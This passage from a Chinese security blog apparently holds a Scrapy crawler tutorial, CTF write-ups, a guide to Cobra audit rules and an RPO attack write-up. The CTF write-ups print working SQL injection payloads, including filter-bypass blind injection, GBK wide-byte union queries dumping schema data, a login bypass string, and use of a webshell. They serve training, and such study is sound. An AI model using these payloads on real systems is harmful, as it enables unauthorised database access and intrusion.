open(filename, &apos;wb&apos;) as f: f.write(item[&apos;url&apos;]+&apos;\\n&apos;) f.write(item[&apos;name&apos;]+&apos;\\n&apos;) f.write(item[&apos;title&apos;][0]) return item 可以看到Pipeline主要运行函数是process_item，其会自动调用，而我们也主要在该函数中实现对数据的操作。上面的代码进行了一个简单的操作，新建一个test文件来存储从Spider传递过来的Item数据，运行的结果如下： 到这里，我们已经实现了一个完整的demo，从运行爬虫，抓取数据，提取数据最后处理数据。 进阶——实现一个通用实用型爬虫模板上面的教程我们已经实现了一个最初级的爬虫，并成功运行，但是也遗留下了许多问题。首先，上面的爬虫只实现了一个网页的爬取以及数据提取，对于我们来说，我们肯定无法满足对单一网页的爬取，身为爬虫必须有跟踪链接与管理url的能力。大部分网上的实现代码都是使用迭代的思想来实现跟踪链接（参考Here），url的管理也要单独实现，由于下载器不会自动调用，我们需要使用request方法来触发并实现回调。这无疑是十分麻烦的，我们使用爬虫框架的目的就是为了简化代码，少写多能。为了实现一个通用实用型爬虫模板，本文并不准备采用迭代来实现，而是使用CrawlSpider类来实现，由于其实现了自动管理url与跟踪，无疑简化了我们代码的实现。 1. Item实现首先明确一下需要提取的数据，从malware-traffic-analysis.net站点的目录开始，跟踪每个页面，从页面中提取可以下载的pcap文件链接。因此，Item的定义如下： from scrapy.item import Item, Field class MalwareItem(Item): title = Field() downloadurl = Field() url = Field() 2. Item Pipeline实现Item Pipeline中进行数据的保存，我将其保存在一个txt文件中，实际上可以进行更多操作。 class MalwarePipeline(object): def __init__(self): self.file = open(&apos;malware.txt&apos;, mode=&apos;wb&apos;) def process_item(self, item, spider): self.file.write(item[&apos;title&apos;]) self.file.write(&quot;\\n&quot;) self.file.write(item[&apos;url&apos;]) self.file.write(&quot;\\n&quot;) self.file.write(item[&apos;downloadurl&apos;]) self.file.write(&quot;\\n&quot;) return item 3. CrawlSpider实现在编写CrawlSipder前，我们先了解一下CrawlSpider是怎么进行url管理和跟踪的。CrawlSpider使用rules来定义抓取url的规则，其可以包含多个Rule对象，每个Rule对象对应一条规则。简单来说，CrawlSpider中定义了一个名为rules的属性，其中包含了许多规则，只要页面中有url命中了其中一条规则，就会被添加入待爬取的url列表，而CrawlSpider对于url的管理和去重等操作都是自动化的。看一下目录中要跟踪url的结构： 大概是”日期+index.html”或”日期+index+数字.html”,所以写出规则： rules = [ Rule(LinkExtractor(allow=(&apos;\\d{2}\\/\\d{2}\\/index(\\d)?\\.html&apos;)), callback=&apos;parse_item&apos;, follow=True) ] 但是这里有个问题，我们可以发现我们抓取到的都是相对路径，对于相对路径，其实CrawlSpider会进行自动填充，但我们也可以自行定义url补充，这里用到了rules的process_links参数，具体优化如下： rules = [ Rule(LinkExtractor(allow=(&apos;\\d{2}\\/\\d{2}\\/index(\\d)?\\.html&apos;)), callback=&apos;parse_item&apos;, process_links = start_urls[0], follow=True) ] 接下来查看一下需要爬取的文件路径源码： 因此，我们根据特征写出xpath语句： xpath(&apos;//ul/li/a[@class=&quot;menu_link&quot;]/@href&apos;) 编写了url抓取规则和xpath的语句，我们接着编写CrawlSpider的总体代码，值得注意的是，CrawlSpider不能使用parse，不然rules规则会被覆盖，因此需要在rules中添加一个回调参数callback来替代parse，具体的实现代码如下： from scrapy.spiders import CrawlSpider, Rule from scrapy.linkextractors import LinkExtractor from scrapy.selector import Selector from malware.items import MalwareItem class malwareSpider(CrawlSpider): name = &apos;malware&apos; download_delay = 1 start_urls = [&apos;http://www.malware-traffic-analysis.net/2018/&apos;] rules = [ Rule(LinkExtractor(allow=(&apos;\\d{2}\\/\\d{2}\\/index(\\d)?\\.html&apos;)), callback=&apos;parse_item&apos;, process_links = start_urls[0], follow=True) ] #这是初始url的回调函数，这里我们不实现 def parse_start_url(self, response): pass def parse_item(self, response): item = MalwareItem() sel = Selector(response) try: item[&apos;title&apos;] = (sel.xpath(&apos;//title/text()&apos;).extract())[0] item[&apos;url&apos;] = response.url item[&apos;downloadurl&apos;] = (sel.xpath(&apos;//ul/li/a[@class=&quot;menu_link&quot;]/@href&apos;).extract())[1] yield item except: pass 在根目录下启动爬虫，爬虫能够成功运行并进行数据抓取： 4. 爬虫的优化与调整在完成上述代码后，依旧存在一些需要解决的问题，首先，源网站待爬取的数据一共有169条，却一共进行了174次爬取，查看记录文件后发现爬虫爬到其他域去了，因此在爬虫加上作用域的限制： allowed_domains = [&apos;malware-traffic-analysis.net&apos;] 查看一下爬到其他域的原因，发现是规则不严谨造成的，于是优化规则内容，避免类似情况发生，Rule的allow是采用正则匹配，我们添加xpath来使规则更加完善，修改后的规则如下： rules = [ Rule(LinkExtractor(allow=(&apos;\\d{2}\\/\\d{2}\\/index(\\d)?\\.html&apos;), restrict_xpaths=(&apos;//ul/li/a[@href]&apos;)), process_links = start_urls[0], callback=&apos;parse_item&apos;, follow=True) ] 即必须在ul/li/a的href属性中的链接才会被提取跟踪，修改后爬取结果如下： 虽然爬取规则正确了，但是查看存储的内容时发现，与预期出现了很大的偏差，主要是在downloadurl这一项上，预期认为总是列表的第二项，实际上许多地方出现了偏差，出现在了列表的第一项或第三项，于是我们需要优化数据筛选规则，使用单一的xpath并无法满足我们，于是我们调用re()方法来添加正则匹配： sel.xpath(&apos;//ul/li/a[@class=&quot;menu_link&quot;]/@href&apos;).re(&apos;(.)+\\.pcap\\.zip&apos;).extract() 上面的代码在实际运行时报错，这里有一个坑，当我调用re()方法时，我下意识地认为这是一个添加正则规则的函数，后来我才re和extract不能同时调用，因为re已经相当于正则+extract。因为第一次接触Spider的人很容易犯这个错误，所以我在这里写出来。实际上，在xpath语法中结合正则表达是一个更好的选择，写法如下： sel.xpath(&apos;//ul/li/a[@class=&quot;menu_link&quot; and contains(@href, &quot;.pcap.zip&quot;)]/@href&apos;).extract() 最后一个问题就是考虑到最后下载文件时需要一个完整的url，而我们抓到都是只是文件名，因此使用urljoin来拼接url，修改pipeline如下： import urlparse class MalwarePipeline(object): def __init__(self): self.file = open(&apos;malware.txt&apos;, mode=&apos;wb&apos;) def process_item(self, item, spider): self.file.write(item[&apos;title&apos;]) self.file.write(&quot;\\n&quot;) self.file.write(item[&apos;url&apos;]) self.file.write(&quot;\\n&quot;) self.file.write(urlparse.urljoin(item[&apos;url&apos;], item[&apos;downloadurl&apos;])) self.file.write(&quot;\\n&quot;) return item 而修改后完整的爬虫Spider代码如下： from scrapy.spiders import CrawlSpider, Rule from scrapy.linkextractors import LinkExtractor from scrapy.selector import Selector from malware.items import MalwareItem class malwareSpider(CrawlSpider): name = &apos;malware&apos; download_delay = 1 allowed_domains = [&apos;malware-traffic-analysis.net&apos;] start_urls = [&apos;http://www.malware-traffic-analysis.net/2018/&apos;] rules = [ Rule(LinkExtractor(allow=(&apos;\\d{2}\\/\\d{2}\\/index(\\d)?\\.html&apos;), restrict_xpaths=(&apos;//ul/li/a[@href]&apos;)), process_links = start_urls[0], callback=&apos;parse_item&apos;, follow=True) ] def parse_start_url(self, response): pass def parse_item(self, response): item = MalwareItem() sel = Selector(response) try: item[&apos;title&apos;] = (sel.xpath(&apos;//title/text()&apos;).extract())[0] item[&apos;url&apos;] = response.url item[&apos;downloadurl&apos;] = (sel.xpath(&apos;//ul/li/a[@class=&quot;menu_link&quot; and contains(@href, &quot;.pcap.zip&quot;)]/@href&apos;).extract())[0] yield item except: pass 爬取成功的数据存储图： 到此为止，一个完整的爬虫模板已经完成，在今后需要重新编写爬虫时，我们的修改流程大致如下：（1）修改Item，决定数据存储的容器结构（2）修改Pipeline，对数据进行操作或存储（3）修改爬虫可行域、初始url（4）修改rules，决定url抓取规则（5）修改xpath，决定数据提取规则 总结源码地址：Here。","tags":[{"name":"scrapy","slug":"scrapy","permalink":"http://yoursite.com/tags/scrapy/"},{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/爬虫/"}]},{"title":"南京邮电大学网络攻防训练平台web综合题专栏","date":"2018-06-12T03:39:32.000Z","path":"2018/06/12/ctf-zh/","text":"这篇博客鸽了很久了，现在放出来给大家，算是填坑。 综合题1题目地址：综合题1 刚进题就是一大堆符号： 一看到这么些个符号，想也没想，直接甩到控制台运行一波看看结果。 hhhh，果然跑出结果了，下个线索肯定在这个文件里，于是小白兔兴高采烈地点开这个文件。 emmmmmm，出题人是真的皮哦。冷静了一下，放下了手中的菜刀，我决定继续做题，整了半天还是在题目链接上找到了提示： 在网上搜索linux-bash找到了一些有用的线索： 在网址中输入这个/.bash_history，看看历史信息中有没有提示： 果然有提示，下载这个文件后，直接找到了这个flag。 综合题2题目地址：综合题2 首先进入题目界面，看一遍日常骚话： 然后在最下面看到关于cms的介绍： 进入界面看到了很多介绍： 然而看到上面的url，小白兔眉头一皱感觉事情并不简单，于是乎尝试了一发： 果然是文件包含，可以在这里直接看源码。于是把所有文件的源码跑出来，由于太多太长了，我不都贴出来了，后面只贴关键性代码。 回到index界面，由于题目提示了该题不是打xss，所以还是先想办法从注入下手，所以一下就看到这个搜索框： 虽然试试搜索功能： 嘿，还不让我用，说是要指定的浏览器才行，我这暴脾气上来了，查看了一下so.php源码： 原来要这个浏览器，于是开启神器burp，直接抓包，改agent： 搞定，可以使用搜索功能了，不让我们用肯定有猫腻，想尝试一下注入，不过在上面看到有防注入，查看一下antiinject.php的源码： 可以分析一下，这个过滤是将敏感字符删除，且只删除一次，由于使用了strtolower这个函数，不能使用大小绕过。所以思路就有了：（1）空格被过滤了，使用/**/替代空格（2）由于只删除一次，所以用两次重复替代关键词，如and -&gt; aandnd（3）由于’=’被过滤，所以使用’&lt;’或’&gt;’来代替 尝试一下： 正确回显和错误回显明显不同，所以可以判断此处可以进行注入。在读sm.txt时我们知道，题目已经把admin数据表的结构告诉我们了，因此我们构造下列语句判断表中记录数： soid=1/**/Anandd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/limit/**/0,1) ——&gt; True soid=1/**/Anandd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/limit/**/1,1) ——&gt; False 从上面的回显可以判断出，数据表中只有一条数据，那估计就是我们登录后台需要的账号密码，继续构造语句注入： #判断用户名长度 soid=1/**/anANDd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/where/**/length(usernanameme)&gt;4) ——&gt; True soid=1/**/anANDd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/where/**/length(usernanameme)&gt;5) ——&gt; False #判断用户密码长度 soid=1/**/anANDd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/where/**/length(userpaspasss)&gt;33) ——&gt; True soid=1/**/anANDd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/where/**/length(userpaspasss)&gt;34) ——&gt; False 从上面的语句可以判断出，用户名长度为5（估计就是admin），而密码是经过加密后的34位长度。注入的语句构造如下： #判断用户名第一个字母： soid=1/**/anANDd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/WHERE/**/ascii(substring(usernanameme/**/,1,1))&gt;96) ——&gt; True soid=1/**/anANDd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/WHERE/**/ascii(substring(usernanameme/**/,1,1))&gt;97) ——&gt; False 从上面构造语句的结构可以判断出第一个字母的ascii码为97，也就是ascii值‘a’。同理，构造语句注出用户名的第二位，第三位以及密码的所有数据。盲注是很令人心烦的时，想偷懒的小伙伴我已经替你们把脚本写好打包好了，可以用脚本直接跑出管理员的数据（源码在后面)： 这里我在跑自己的程序时，发现跑出的密码还包含‘空格’，而网上其他人关于该题的脚本跑出的密码却是34位的纯数字，这一度让我对自己的脚本产生怀疑，我花了很多时间找自己代码的错误，然而并没有找到。直到后来，我发现上面的sm.txt中提到，他们自己写了一个加密算法，在passencode.php中，于是查看源码： 加密的方式很简单，就是把ascii值转成ascii码后连接，而连接的中间符号就是‘空格’。因此我跑的结果其实是合理的，后来我又分析了网上其他人的脚本，发现确实是他们写错了，他们没有考虑到‘空格’这个字符，所以遇到到时全输出成了数字0。这个故事告诉我们，不要盲目相信网上公认的解题脚本，他们可能也会出错！我写的脚本：Here，不过需要python3以及request包。最后的密码直接用ascii码反解ascii值就行，解出的明文密码为fuckruntu。 有了管理员账号密码，然后就找后台了，后台很好找，在about.php的源码里就有： 所以进入后台地址：http://cms.nuptzj.cn/loginxlcteam/ 查看，发现是后台，于是输入我们获得的管理员账号密码： 成功进入后台，显示如下： emmmm，看来程序员是真的懒，居然给自己的网站放了一句话木马，我们还是用文件包含去看一下这个木马： 直接把这一句话木马复制到google查，发现这是一个回调函数的一句话木马，使用方法大致如下： 读了一下phpinfo()发现还是禁了一些函数，不过我们还是有办法读取目录文件列表： 拿到了存着flag的文件名，我们使用之前的文件包含就可以直接读flag了： 总结国内最近迎来了一批ctf热潮，而且看起来还会持续很长一段时间，感兴趣的朋友可以多看看ctf的题，南邮的题目还是比较基础的，还是有很多平台提供不错的题目，而看看往届比赛的题目的writeUp也是不错的选择。","tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"Cobra静态白盒审计工具规则编写基础","date":"2018-04-19T03:39:32.000Z","path":"2018/04/19/cobra/","text":"眼镜蛇(Cobra)是一款定位于静态代码安全分析的工具，目标是为了找出源代码中存在的安全隐患或者漏洞。由于开发人员的技术水平和安全意识各不相同，导致可能开发出一些存在安全漏洞的代码。 攻击者可以通过渗透测试来找到这些漏洞，从而导致应用被攻击、服务器被入侵、数据被下载、业务受到影响等等问题。 “源代码安全审计”是指通过审计发现源代码中的安全隐患和漏洞，而Cobra可将这个流程自动化。而本文主要讲解如何进行Cobra的规则库编写，希望对cobra有定制需求的朋友有所帮助。 十大规则字段Cobra的规则文件格式是xml，因此在文件的开头往往需要声明版本和编码，然后以&lt; cobra >标签表明这是个cobra的规则文件： 而规则的具体内容就写在&lt; cobra >标签内，而Cobra提供了十种字段来让开发者描述规则，接下来我将详细讲解这十大规则字段。 name字段name是由Cobra提供的用来描述规则的名字的字段，内容是字符串类型，因此在编写规则前先给你的规则取个合适的名字吧： language字段language是由Cobra提供的用来声明规则适用的编程语言的字段，内容是字符串类型，当在language字段声明了指定语言时，扫描器将不会使用该规则检测language以外的编程语言代码： 上图所示，该规则只会由于检测以.php/.php3/.php4/.php5为后缀的文件代码，而Cobra支持检测的语言以及对应文件后缀详见：Cobra语言支持。 如果希望编写的规则适用于所有语言，则如下编写language字段: &lt;language value=&quot;*&quot;/&gt; level字段level是由Cobra提供的用来声明该漏洞风险等级的字段，内容为一个整型数字，一共有十种风险等级，为1-10级，等级越高则说明危害越高。一般来说，风险等级按以下标准来设定： 等级 分值 描述 严重 9-10 1.可获取服务器权限; 2.严重信息泄露; 高危 6-8 1.敏感信息泄露; 2.越权; 3.任意文件读取; 4.SQL注入; 5.git/svn泄露; 6.SSRF; 中危 3-5 1.XSS; 2.URL跳转; 3.CRLF; 4.LFI; 低危 1-2 1.CSRF; 2.JSONP劫持; 3.异常堆栈信息; 3.PHPINFO; 4.路径泄露; 5.硬编码密码; 6.硬编码内网IP域名; 7.不安全的加密方法; 8.不安全的随机数; 9.日志敏感记录; 我们声明一个风险等级为3的漏洞： status字段status字段设置了是否开启该规则的扫描，使用on/off来标记，只有当标记为on时，该规则才会生效： match字段match字段是用来声明规则具体内容的字段，而在&lt; match > 标签的内部就是规则的具体内容。match是Cobra规则的核心字段，因为它定义了规则的具体内容和检测方法，而在编写规则前需要先定义match的唯一属性：mode。 mode属性mode属性决定了match的检测模式，当mode属性的值不同时，代码检测的模式不同，比如使用“regex-only-match”模式时，就是进行正则匹配的方式扫描代码，找出所有与正则表达式相匹配的源码，并将之标记为漏洞。而当检测模式设置为“function-param-controllable”时，就会检测所设定函数的所有调用，如果传入该函数的参数是用户可控的，则标记为漏洞。而mode一共有四种检测模式： Mode 类型 默认模式 支持语言 描述 regex-only-match 正则仅匹配 是 * 默认是此模式，但需要显式的写在规则文件里。以正则的方式进行匹配，匹配到内容则算作漏洞 regex-param-controllable 正则参数可控 否 PHP/Java 以正则模式进行匹配，匹配出的变量可外部控制则为漏洞 function-param-controllable 函数参数可控 否 PHP 内容写函数名，将搜索所有该函数的调用，若参数外部可控则为漏洞 find-extension 寻找指定后缀文件 否 * 找到指定后缀文件则算作漏洞 规则内容规则内容是写在&lt; match >标签内的具体检测内容，编写的规则内容要与mode属性相对应，不然无法检测，如当使用“regex-only-match”模式时，规则内容就应该是正则表达式，而使用“function-param-controllable”模式时，规则内容就应该是函数名。 我们编写一个测试规则内容，以正则匹配的方式来匹配&lt; test &gt;标签： 我们编写一个php文件，在里面写入代码：echo ‘&lt;test&gt; just for test &lt;/test&gt;’，然后使用我们编写的规则对其进行检测，检测结果： 如图所示，能够按照规则检测出恶意代码。 match2字段由于仅仅使用match一个字段无法应对许多特殊的漏洞规则编写需求，因此Cobra提供了两个字段来辅助match字段更好地进行规则编写，而match2字段就是其中之一。match2的作用是在match成功匹配到的前提下，进行二次匹配，只有match2也匹配成功，则标记为漏洞。而match2拥有block属性，在编写二次规则前需要先给block属性赋值。 block属性block属性是match2的唯一属性，其定义了二次匹配的匹配范围，比如当block的值为“in-current-line”时，二次匹配范围则在match匹配到的行中，而当block的值为“in-file”时，则范围会在match匹配到的位置所在的文件中。block属性具体可以取的值如下表所示：| 区块 | 描述 || - | :-: || in-current-line | 由第一条规则触发的所在行 || in-function | 由第一条规则触发的函数体内 || in-function-up | 由第一条规则触发的所在行之上，所在函数体之内 || in-function-down | 由第一条规则触发的所在行之下，所在函数体之内 || in-file | 由第一条规则触发的文件内 || in-file-up | 由第一条规则触发的所在行之上，所在文件之内 || in-file-down | 由第一条规则触发的所在行之下，所在文件之内 | 规则2内容规则2内容是写在&lt;match2&gt;标签内的二次检测规则，拿上面的例子，我们继续尝试编写二次匹配规则，在匹配&lt;test&gt;标签的前提下，检测该行内出现‘not’这个单词则视为漏洞： 对测试用例进行检测结果： 可以看见，语句echo ‘&lt;test&gt; just for test &lt;/test&gt;’已经不被视为漏洞，因为该行中不包含match2所要求的not单词。而echo ‘&lt;test&gt; not just for test &lt;/test&gt;’则与我们期待的一样被标记为漏洞。 多次使用值得一提的是，由于match2字段是用来辅助match而存在的字段，因此它并不能独立于match字段存在，只有match字段存在时，它才能被使用。而match2可以被多次使用，绑定于同个match进行多次匹配，我们尝试编写多个match2进行测试： 检测结果： 可以看到，多次使用的match2的结果并不是match+match2(1)+match2(2),而是match+match2(1)或match+match(2)。 repair字段上文说过，Cobra使用了2个字段来辅助match字段进行更好的匹配，除了match2字段，另一个就是repair字段。从用法上来说，repair字段和match2字段基本上一模一样，但是他们的作用却是完全相反。在match匹配的前提下，当match2二次匹配成功时，标记为漏洞，而repair却是二次匹配成功时，视为漏洞已被修复，不再标记为漏洞。 继续上面的例子，我们编写二次匹配规则，在匹配&lt;test&gt;标签的前提下，检测该行内出现‘not’这个单词则视为漏洞已被修复： 检测结果： 可以看到，检测结果呈现与match2完全相反的结果，这是因为match的前提下，该行匹配到not则不视为漏洞，所以最后就呈现了这种结果。 当match2字段和repair字段同时使用时，repair的优先级高于match2。 solution字段这个字段很好理解，当漏洞被标记时显示解决方法，内容为字符串，且会直接显示在被标记的漏洞下。往往在该字段内描述详细的解决方法以帮助商家修复漏洞，编辑： 直接显示： test字段该字段用来写规则对应测试用例，在&lt;test&gt;字段内，每一个&lt;case&gt;字段都视为一个测试用例，case的属性assert用来表名该测试用例是正面例子还是反面例子，当assert值为true时，该测试用例是能匹配出漏洞的，而当assert为false时，该测试用例是没有漏洞的，而属性remark只是一个备注： 比较遗憾的是，我并没有找到直接在规则文件中测试测试用例的方法，希望Cobra在更新文档后能够对此进行说明。 author字段这是Cobra提供的最后一个字段，用来标明该规则编写的作者是谁，毕竟辛苦编写了规则，那就署上你的大名吧： 规则文件命名规则文件的命名规则： 统一存放在rules目录 大写字母CVI（Cobra Vulnerability ID）开头，横杠（-）分割 六位数字组成，前三位为Label ID，后三位为自增ID 结尾以小写.xml结束例子：rules/CVI-110001.xml值得注意的是，六位数字的前三位代表了漏洞类型，比如上文中我的规则文件命名为CVI-110003.xml，开头为110，因此被分到了“错误的配置”这一类。 具体的漏洞类别分类与定制详见：Cobra漏洞命名分类。 编写Rpo攻击漏洞规则rpo攻击rpo攻击是一种因为相对路径调用资源文件而产生的漏洞，详细见：rpo攻击浅析。 编写规则文件由于rpo攻击属于xss攻击的一种，因此我把规则文件的名称设置成了CVE-140006.xml。规则的目的是匹配php中的使用相对路径调用js文件的语句，将其视为漏洞，提醒开发人员rpo攻击的可能性。具体规则如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;cobra document=&quot;https://github.com/FeeiCN/cobra&quot;&gt; &lt;name value=&quot;相对路径可能导致的rpo攻击漏洞&quot;/&gt; &lt;language value=&quot;php&quot;/&gt; &lt;match mode=&quot;regex-only-match&quot;&gt; &lt;![CDATA[&lt;script(\\s)+(.)*src(\\s)*=(\\s)*&quot;[^/\\/{](.)*\\.js&quot;(\\s)*&gt;(\\s)*(.)*(\\s)*(&lt;/script&gt;)]]&gt; &lt;/match&gt; &lt;repair block=&quot;in-current-line&quot;&gt; &lt;![CDATA[&lt;script(\\s)+(.)*src(\\s)*=(\\s)*&quot;(http://|https://)(.)*\\.js&quot;(\\s)*&gt;(\\s)*(.)*(\\s)*(&lt;/script&gt;)]]&gt; &lt;/repair&gt; &lt;level value=&quot;3&quot;/&gt; &lt;solution&gt; ## 安全风险 js对资源进行引用时采用了相对路径，即有可能导致rpo攻击漏洞 ## 修复方案 使用绝对路径访问资源 &lt;/solution&gt; &lt;test&gt; &lt;case assert=&quot;true&quot;&gt;&lt;![CDATA[ &lt;script src = &quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt; ]]&gt;&lt;/case&gt; &lt;/test&gt; &lt;test&gt; &lt;case assert=&quot;false&quot;&gt;&lt;![CDATA[ &lt;script src = &quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt; ]]&gt;&lt;/case&gt; &lt;/test&gt; &lt;test&gt; &lt;case assert=&quot;false&quot;&gt;&lt;![CDATA[ &lt;script src = &quot;http://1.1.1.1/static/js/jquery.min.js&quot;&gt;&lt;/script&gt; ]]&gt;&lt;/case&gt; &lt;/test&gt; &lt;status value=&quot;on&quot;/&gt; &lt;author name=&quot;whiterabbit&quot; email=&quot;whiterabbit@qq.com&quot;/&gt; &lt;/cobra&gt; 测试结果测试结果图: 其他附上Cobra官方中文文档连接：Cobra中文文档。","tags":[{"name":"cobra","slug":"cobra","permalink":"http://yoursite.com/tags/cobra/"},{"name":"审计","slug":"审计","permalink":"http://yoursite.com/tags/审计/"},{"name":"规则","slug":"规则","permalink":"http://yoursite.com/tags/规则/"}]},{"title":"RPO攻击初体验","date":"2018-04-02T03:39:32.000Z","path":"2018/04/02/rpo/","text":"上周参加了CTF比赛，虽然结果一般般，但还是学到了不少东西，比如RPO攻击。RPO(Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应与服务器的 Web 缓存技术和配置差异，利用前端代码中加载的css/js的相对路径来加载其他文件，最终浏览器将服务器返回的不是css/js的文件当做css/js来解析，从而导致XSS，信息泄露等漏洞产生。这种攻击在网络上资料较少，如果不是参加比赛还真不会去了解这种攻击技术，所以这里分享给大家。 了解RPO如果让我来解释RPO，大概就是利用css、js的相对路劲分析漏洞进行的攻击，原理：1.在Url中使用%2f来代替/2.Url在浏览器分析时，会把%2f解码为/，然后就正常返回页面3.但是css/js在解析时，不会进行解码，所以就出现了目录覆盖的情况4.产生这种漏洞的最大原因是CSS/js解析器的一个特性：浏览器在解析CSS/js样式时，会忽略非法的部分，直到找到正确的开始然后进行解析一直到结束。所以当我们植入CSS/js代码，欺骗CSS/js解析器忽略之前不合法的语法内容，从而加载我们注入的CSS/js内容。5.一般来说，在phpinfo框架中出现这种情况的可能性比较大（phpinfo框架：1.2.3.4:80/index.php/pp/123/,并不是有pp和123这两个目录，url在phpinfo模式下会解析成index.php?mode=pp&amp;id=123） 详见：RPO攻击详解1RPO攻击详解2 比赛实例周末CTF的比赛要求对一个系统进行审查，然后提交漏洞，管理员会进行查看。这一看就是要的钓管理员的cookie，目测就是xss。于是先开始观察系统 所以大概了解到，是通过写文章注入xss语句，然后在查看文章中确定语句可行性，然后提交钓cookie。不过发现&lt;&gt;标签被过滤，且没法写入script标签，但是在发现index.php页面发现js是调用的相对路径： 在查看文章发现系统是phpinfo的url解析框架： 于是决定采用RPO攻击，基本思路是通过写文章写入不含script标签的xss语句，然后通过RPO攻击将文章内容当成js来执行。经过尝试，当标题有内容时，会引入”&lt; h &gt;”标签，这会影响js解析，所以标题设为空，只在内容出写入xss语句： 然后构造url: http://39.107.33.96:20000/index.php/view/article/2525/..%2f..%2f..%2f 这里解释一下，当url在服务器端执行时，会被解析为index.php/view/article/2525/../../../，也就是等价于index.php，所以返回了index.php的资源。但是在客户端进行显示时，客户端发现要执行js代码，于是向服务器端发出了资源申请，申请的url为: http://39.107.33.96:20000/index.php/view/article/2525/..%2f..%2f..%2f/static/js/jquery.min.js 但是这里出现了一个问题，由于css/js解析器的会无视非法部分，于是..%2f..%2f..%2f/这段就被忽略了，于是url变成了： http://39.107.33.96:20000/index.php/view/article/2525/static/js/jquery.min.js 然后该url传给服务器，很显然，在服务器端并不存在这么一个js文件，但并没有关系，由于服务器采用的phpinfo的url解析模式，于是这条url便被解析成了 http://39.107.33.96:20000/index.php?mode=view&amp;article=2525&amp;static=js&amp;jquery.min.js= 于是服务器返回了index.php/view/article/2525/的内容，也就是alert（1）。这时客户端拿到资源后，将这段代码当成了js语句来执行，成功进行了RPO攻击： 找到了xss点，剩下的就简单了，提交我们精心构造的url和xss页面去调取管理员cookie，由于本章主要讲解RPO攻击，剩下的就不写了，有兴趣的小伙伴可以去继续做下去：题目点我。 其他小白兔的团队又加入了三位小伙伴，欢迎他们的加入(～￣▽￣)～ (～￣▽￣)～ (～￣▽￣)～ ，希望今后一起成长，一起努力，干巴爹o(￣▽￣)ｄ 。","tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"},{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"},{"name":"RPO","slug":"RPO","permalink":"http://yoursite.com/tags/RPO/"}]},{"title":"南京邮电大学网络攻防训练平台sql注入题目专栏","date":"2018-03-19T03:39:32.000Z","path":"2018/03/19/ctf-sql/","text":"为了参加不久后的国内CTF比赛，小白兔进行了各种备战，进行了许多CTF题目的练习。后来在南邮的训练平台上做题，感觉收获颇多，尤其是在sql注入题目上。因此特地在这里记录下来，留给后来人借鉴。 题目一：MYSQL 题目地址：MYSQL 刚进题目页面就是一句提示： 于是按照提示进入/web11/robots.txt看看有什么名堂： 可以捕获几个信息：1.可注入的文件是sql.php2.注入的参数是id3.基本没有防注入设置 因此这个题目不难，大概的意思是你要从id=1024的数据库记录中提出flag数据，但是程序会在id不等于1024时打印你查询出来的东西（没错这是矛盾的）。解题的关键在intval（）这个函数，这个函数的作用是把参数自动转换成整数（int）。那就很简单了，我们使id=1024.5，这样经过函数转换后$id变成1024，查到flag，然后由于id不等于1024，再打印出flag。构造语句： http://chinalover.sinaapp.com/web11/sql.php?id=1024.5 题目二：sql injection 3 题目地址：sql injection 3 这是个很好的题目！进入题目界面： sql查询的语句直接展示给你了，把id改成2查看一下： 当id=3的时候，查询出的也是个无关痛痒的东西，当id大于3后，就不显示了，说明数据库里只有3条记录，尝试加个单引号（’）注入试试： 我先试了一下url编码，发现无法绕过，然后突然想起当id=2时的信息：gbk_sql_injection，猜测这里存在宽字节注入漏洞，这个漏洞很有趣，可以利用编码漏洞吃掉一个反斜杠（\\）: 宽字节漏洞详解。构造语句尝试宽字节注入： http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&apos; and 1=1# 发现已经注入成功了，反斜杠被吃掉了，但是有个问题，使用#注释掉尾部的单引号时时似乎被过滤了，于是用编码绕过一下，发现成功了： OK，注入点确定后开始构造语句进行注入： http://chinalover.sinaapp.com/SQL-GBK/index.php?id=4%df&apos; union select 1,2%23 知道回显位置后可以用手工注入慢慢注，不过我比较懒，直接使用土耳其暴库法直接爆出数据库： http://chinalover.sinaapp.com/SQL-GBK/index.php?id=4%df&apos; union select 1,concat(0x5B78786F6F5D,GROUP_CONCAT(DISTINCT+table_schema),0x5B78786F6F5D)+from+information_schema.columns%23 有了数据库名，转为16进制以后继续暴处表名，构造语句: http://chinalover.sinaapp.com/SQL-GBK/index.php?id=4%df&apos; union select 1,concat(0x5B78786F6F5D,GROUP_CONCAT(DISTINCT+table_name),0x5B78786F6F5D)+from+information_schema.columns+where+table_schema=0x7361652d6368696e616c6f766572%23 爆出表名后，就一个个去试了，我一个个去试过了，前3个表都没什么信息，不过表ctf4就有东西，构造语句： http://chinalover.sinaapp.com/SQL-GBK/index.php?id=4%df&apos; union select 1,concat(0x5B78786F6F5D,GROUP_CONCAT(DISTINCT+column_name),0x5B78786F6F5D)+from+information_schema.columns+where+table_name=0x63746634%23 最后一步了，直接构造查询语句得到我们想要的flag： http://chinalover.sinaapp.com/SQL-GBK/index.php?id=4%df&apos; union select 1,flag from ctf4 limit 1%23 总的来说，这个题目不仅考察了手工注入的能力，还涉及到了字符编码绕过和宽字节注入漏洞，真的是个很不错的题目。 题目三：SQL注入1题目地址：SQL注入1 进入题目界面，发现是一个登陆框，而且大方地把源码地址给你： 查看源码进行分析，发现对参数进行处理的只有trim（）函数，该函数的作用是除去字符串前后的空格（也就是毫无卵用）： 那这个题目就毫无难度了，根据语句构造万能密码绕过: user=admin&quot;&apos;) or 1=1 #--&amp;pass=1 题目四：sql injection 4提米地址：sql injection 4 